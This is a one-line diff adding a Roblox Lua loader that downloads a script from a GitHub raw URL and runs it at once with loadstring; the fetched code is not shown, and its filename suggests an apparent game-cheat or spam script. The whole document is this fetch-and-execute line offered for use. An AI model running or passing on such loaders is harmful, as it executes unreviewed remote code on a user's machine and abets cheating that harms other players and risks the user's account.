@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/new-zombie-air-force-spam5-qu94hmjro1qq0w.lua"))()
